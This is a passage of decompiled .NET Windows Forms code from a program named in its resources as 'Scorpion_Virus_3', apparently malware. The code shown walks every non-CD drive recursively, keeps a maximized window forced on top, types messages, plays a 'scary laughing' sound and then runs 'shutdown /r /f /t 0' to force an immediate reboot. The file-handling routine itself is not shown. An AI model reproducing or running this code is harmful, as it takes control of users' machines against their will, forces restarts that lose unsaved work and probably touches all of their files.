      Application.DoEvents();
      checked { ++index; }
label_28:
      num3 = 27;
label_29:
      if (index < processes.Length)
      {
        process = processes[index];
        goto label_5;
      }
      goto label_36;
label_31:
      num2 = num3;
      switch (num1 > -2 ? num1 : 1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_1;
            case 2:
              goto label_2;
            case 3:
              goto label_3;
            case 4:
              goto label_5;
            case 5:
              goto label_6;
            case 6:
              goto label_7;
            case 7:
              goto label_8;
            case 8:
              goto label_9;
            case 9:
              goto label_10;
            case 10:
              goto label_11;
            case 11:
              goto label_12;
            case 12:
              goto label_13;
            case 13:
              goto label_14;
            case 14:
              goto label_15;
            case 15:
              goto label_16;
            case 16 /*0x10*/:
              goto label_17;
            case 17:
              goto label_18;
            case 18:
              goto label_19;
            case 19:
              goto label_20;
            case 20:
              goto label_21;
            case 21:
              goto label_22;
            case 22:
              goto label_23;
            case 23:
              goto label_24;
            case 24:
              goto label_25;
            case 25:
              goto label_26;
            case 26:
              goto label_27;
            case 27:
              goto label_28;
            case 28:
              goto label_36;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_31;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_36:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  private void Form1_Shown(object sender, EventArgs e)
  {
label_1:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = -2;
label_2:
      int num3 = 2;
      Application.DoEvents();
label_3:
      num3 = 3;
      this.PlayVideo();
label_4:
      num3 = 4;
      this.Timer6.Enabled = true;
label_5:
      num3 = 5;
      DriveInfo[] drives = DriveInfo.GetDrives();
label_6:
      num3 = 6;
      DriveInfo[] driveInfoArray = drives;
      int index = 0;
      goto label_16;
label_8:
      num3 = 7;
      Application.DoEvents();
label_9:
      num3 = 8;
      DriveInfo driveInfo;
      if (~(-(driveInfo.DriveType == DriveType.CDRom ? 1 : 0) | 2 | 0 | 4) == 0)
        goto label_13;
label_10:
      num3 = 9;
      Application.DoEvents();
label_11:
      num3 = 10;
      Application.DoEvents();
label_12:
      num3 = 11;
      this.WalkDirRecursive(driveInfo.Name);
label_13:
label_14:
      num3 = 13;
      Application.DoEvents();
      checked { ++index; }
label_15:
      num3 = 14;
label_16:
      if (index < driveInfoArray.Length)
      {
        driveInfo = driveInfoArray[index];
        goto label_8;
      }
      goto label_23;
label_18:
      num2 = num3;
      switch (num1 > -2 ? num1 : 1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_1;
            case 2:
              goto label_2;
            case 3:
              goto label_3;
            case 4:
              goto label_4;
            case 5:
              goto label_5;
            case 6:
              goto label_6;
            case 7:
              goto label_8;
            case 8:
              goto label_9;
            case 9:
              goto label_10;
            case 10:
              goto label_11;
            case 11:
              goto label_12;
            case 12:
              goto label_13;
            case 13:
              goto label_14;
            case 14:
              goto label_15;
            case 15:
              goto label_23;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_18;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_23:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  private void AxWindowsMediaPlayer2_Enter(object sender, EventArgs e)
  {
  }

  private void Timer3_Tick(object sender, EventArgs e)
  {
label_1:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = -2;
label_2:
      int num3 = 2;
      this.Label1.Visible = true;
label_3:
      num3 = 3;
      this.Label1.Location = new Point(checked ((int) Math.Round(unchecked ((double) this.Width / 2.0 - (double) this.Label1.Width / 2.0))), checked ((int) Math.Round(unchecked ((double) this.Height / 2.0 - (double) this.Label1.Height / 2.0))));
label_4:
      num3 = 4;
      if (this.Label1.Text.Length != this.str.Length)
        goto label_8;
label_5:
      num3 = 5;
      this.Timer3.Enabled = false;
label_6:
      num3 = 6;
      this.count = 1;
label_7:
      num3 = 7;
      this.Timer4.Enabled = true;
      goto label_17;
label_8:
label_9:
      num3 = 10;
      this.Label1.Text = this.str.Substring(0, this.count);
label_10:
      num3 = 11;
      checked { ++this.count; }
      goto label_17;
label_12:
      num2 = num3;
      switch (num1 > -2 ? num1 : 1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_1;
            case 2:
              goto label_2;
            case 3:
              goto label_3;
            case 4:
              goto label_4;
            case 5:
              goto label_5;
            case 6:
              goto label_6;
            case 7:
              goto label_7;
            case 8:
            case 12:
              goto label_17;
            case 9:
              goto label_8;
            case 10:
              goto label_9;
            case 11:
              goto label_10;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_12;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_17:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  private void Timer4_Tick(object sender, EventArgs e)
  {
label_1:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = -2;
label_2:
      int num3 = 2;
      this.Label2.Visible = true;
label_3:
      num3 = 3;
      this.Label2.Location = new Point(checked ((int) Math.Round(unchecked ((double) this.Width / 2.0 - (double) this.Label2.Width / 2.0))), checked ((int) Math.Round(unchecked ((double) this.Height / 2.0 - (double) this.Label2.Height / 2.0 + 45.0))));
label_4:
      num3 = 4;
      if (this.Label2.Text.Length != this.str2.Length)
        goto label_8;
label_5:
      num3 = 5;
      this.Timer4.Enabled = false;
label_6:
      num3 = 6;
      this.count = 1;
label_7:
      num3 = 7;
      this.Timer5.Enabled = true;
      goto label_17;
label_8:
label_9:
      num3 = 10;
      this.Label2.Text = this.str2.Substring(0, this.count);
label_10:
      num3 = 11;
      checked { ++this.count; }
      goto label_17;
label_12:
      num2 = num3;
      switch (num1 > -2 ? num1 : 1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_1;
            case 2:
              goto label_2;
            case 3:
              goto label_3;
            case 4:
              goto label_4;
            case 5:
              goto label_5;
            case 6:
              goto label_6;
            case 7:
              goto label_7;
            case 8:
            case 12:
              goto label_17;
            case 9:
              goto label_8;
            case 10:
              goto label_9;
            case 11:
              goto label_10;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_12;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_17:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  private void Timer5_Tick(object sender, EventArgs e)
  {
label_1:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = -2;
label_2:
      int num3 = 2;
      this.Label3.Visible = true;
label_3:
      num3 = 3;
      this.Label3.Location = new Point(checked ((int) Math.Round(unchecked ((double) this.Width / 2.0 - (double) this.Label3.Width / 2.0))), checked ((int) Math.Round(unchecked ((double) this.Height / 2.0 - (double) this.Label3.Height / 2.0 + 90.0))));
label_4:
      num3 = 4;
      if (this.Label3.Text.Length != this.str3.Length)
        goto label_8;
label_5:
      num3 = 5;
      MyProject.Computer.Audio.Play((Stream) Scorpion_Virus_3.My.Resources.Resources.scary_laughing, AudioPlayMode.Background);
label_6:
      num3 = 6;
      Interaction.Shell("shutdown /r /f /t 0");
label_7:
      num3 = 7;
      this.Timer5.Enabled = false;
      goto label_17;
label_8:
label_9:
      num3 = 10;
      this.Label3.Text = this.str3.Substring(0, this.count);
label_10:
      num3 = 11;
      checked { ++this.count; }
      goto label_17;
label_12:
      num2 = num3;
      switch (num1 > -2 ? num1 : 1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_1;
            case 2:
              goto label_2;
            case 3:
              goto label_3;
            case 4:
              goto label_4;
            case 5:
              goto label_5;
            case 6:
              goto label_6;
            case 7:
              goto label_7;
            case 8:
            case 12:
              goto label_17;
            case 9:
              goto label_8;
            case 10:
              goto label_9;
            case 11:
              goto label_10;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_12;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_17:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  private void Timer6_Tick(object sender, EventArgs e)
  {
label_1:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = -2;
label_2:
      int num3 = 2;
      Application.DoEvents();
label_3:
      num3 = 3;
      this.TopMost = true;
label_4:
      num3 = 4;
      this.BringToFront();
label_5:
      num3 = 5;
      this.Focus();
label_6:
      num3 = 6;
      this.WindowState = FormWindowState.Maximized;
      goto label_13;
label_8:
      num2 = num3;
      switch (num1 > -2 ? num1 : 1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_1;
            case 2:
              goto label_2;
            case 3:
              goto label_3;
            case 4:
              goto label_4;
            case 5:
              goto label_5;
            case 6:
              goto label_6;
            case 7:
              goto label_13;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_8;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_13:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  private void Label2_Click(object sender, EventArgs e)
  {
  }
}
